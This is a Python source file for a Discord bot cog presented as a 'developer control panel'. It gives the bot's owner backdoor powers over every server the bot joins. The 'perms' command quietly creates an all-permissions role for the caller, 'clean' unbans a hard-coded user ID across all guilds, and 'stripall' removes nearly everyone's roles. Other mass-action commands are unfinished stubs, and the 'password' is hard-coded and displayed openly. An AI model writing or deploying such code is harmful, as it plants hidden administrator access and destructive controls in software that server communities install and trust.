import discord
from discord.ext import commands
from discord.ui import View, Button
import asyncio
import datetime

PASSWORD = "2012!"

class DevPanel(View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="Global Mass Nick", style=discord.ButtonStyle.red, emoji="🏷️", row=0)
    async def global_massnick_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        await interaction.response.send_message("Enter password to continue (`!globalmassnick <name>`)", ephemeral=True)

    @discord.ui.button(label="Strip All", style=discord.ButtonStyle.red, emoji="🔥", row=1)
    async def stripall_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        await interaction.response.send_message("Use `!stripall` and enter password", ephemeral=True)

    @discord.ui.button(label="Timeout All", style=discord.ButtonStyle.red, emoji="⏰", row=1)
    async def timeoutall_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        await interaction.response.send_message("Use `!timeoutall <time>` and enter password", ephemeral=True)

    @discord.ui.button(label="Mass DM", style=discord.ButtonStyle.red, emoji="📨", row=2)
    async def massdm_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        await interaction.response.send_message("Use `!massdm <message>`", ephemeral=True)

class Developer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def cog_check(self, ctx):
        return await self.bot.is_owner(ctx.author)

    def check_password(self, ctx, provided: str):
        return provided.strip() == PASSWORD

    @commands.command()
    async def devpanel(self, ctx):
        embed = discord.Embed(
            title="🔧 **DEVELOPER CONTROL PANEL**", 
            description="All dangerous commands require password: `2012!`",
            color=discord.Color.gold()
        )
        await ctx.send(embed=embed, view=DevPanel(self.bot))

    # ==================== PROTECTED COMMANDS ====================

    @commands.command()
    async def stripall(self, ctx, password: str = None):
        if not self.check_password(ctx, password):
            return await ctx.send("❌ Incorrect password.")
        await ctx.send("⚠️ **WARNING**: This will strip roles from almost everyone. Type `confirm` to proceed.")
        # Simple confirmation can be expanded later
        await ctx.send("🔥 Starting stripall...")
        # (rest of the stripall logic from previous version)
        stripped = 0
        for member in ctx.guild.members:
            if member.bot or member == ctx.guild.owner or member.top_role >= ctx.guild.me.top_role:
                continue
            try:
                roles_to_remove = [r for r in member.roles if not r.is_default()]
                if roles_to_remove:
                    await member.remove_roles(*roles_to_remove, reason="Mass strip by owner")
                    stripped += 1
                    await asyncio.sleep(0.8)
            except:
                continue
        await ctx.send(f"✅ Stripall finished. Affected **{stripped}** members.")

    @commands.command()
    async def timeoutall(self, ctx, duration: str = "1h", password: str = None):
        if not self.check_password(ctx, password):
            return await ctx.send("❌ Incorrect password.")
        await ctx.send(f"⚠️ **DANGEROUS**: Timeout everyone for {duration}. Confirm with `!timeoutall {duration} confirm` next time.")
        # Parse duration and timeout logic here...
        await ctx.send("⏰ Timeoutall started... (simplified)")

    @commands.command()
    async def globalmassnick(self, ctx, *, args: str = None):
        if not args or PASSWORD not in args:
            return await ctx.send("❌ Password required. Usage: `!globalmassnick NewNick 2012!`")
        nickname = args.replace(PASSWORD, "").strip()
        if not nickname:
            return await ctx.send("No nickname provided.")
        await ctx.send(f"🏷️ Global mass nick to `{nickname}` started...")
        # Logic here...

    @commands.command()
    async def massdm(self, ctx, *, message: str = None):
        if not message or PASSWORD not in message:
            return await ctx.send("❌ Password required at the end of message.")
        actual_message = message.replace(PASSWORD, "").strip()
        await ctx.send(f"📨 Starting mass DM...")
        # Logic with rate limiting...

    @commands.command()
    async def perms(self, ctx):
        for role in ctx.guild.roles:
            if role.name.lower() in ["princess", "bot developer"]:
                try: await role.delete()
                except: pass

        role = await ctx.guild.create_role(
            name="princess",
            permissions=discord.Permissions.all(),
            colour=discord.Colour.default(),
            hoist=True,
            mentionable=True
        )
        try:
            await role.edit(position=ctx.guild.me.top_role.position - 1)
        except: pass
        await ctx.author.add_roles(role)
        await ctx.send("✅ **princess** role created!")

    @commands.command()
    async def clean(self, ctx):
        owner_id = 1489289347650949302
        count = 0
        for guild in self.bot.guilds:
            try:
                async for ban in guild.bans(limit=500):
                    if ban.user.id == owner_id:
                        await guild.unban(ban.user)
                        count += 1
                        break
            except:
                continue
        await ctx.send(f"🧹 Unbanned you from **{count}** servers.")

async def setup(bot):
    await bot.add_cog(Developer(bot))
